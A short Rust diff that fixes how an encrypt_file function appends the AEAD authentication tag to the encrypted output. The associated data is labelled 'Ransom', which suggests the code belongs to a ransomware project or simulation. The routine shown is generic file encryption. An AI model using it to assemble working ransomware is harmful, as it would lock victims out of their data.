@@ -58,13 +58,14 @@ fn encrypt_file(
 
     let associated_data = Aad::from(b"Ransom");
 
-    let tag = sealing_key.seal_in_place_separate_tag(associated_data, &mut in_out).unwrap();
+    let binding = sealing_key.seal_in_place_separate_tag(associated_data, &mut in_out).unwrap();
+    let tag = binding.as_ref();
 
     let mut output_file = OpenOptions::new()
         .write(true)
         .create(true)
         .open(output_file_path)?;
-    output_file.write_all(&in_out)?;
+    output_file.write_all(&[&in_out,tag].concat())?;
 
     Ok(())
 }
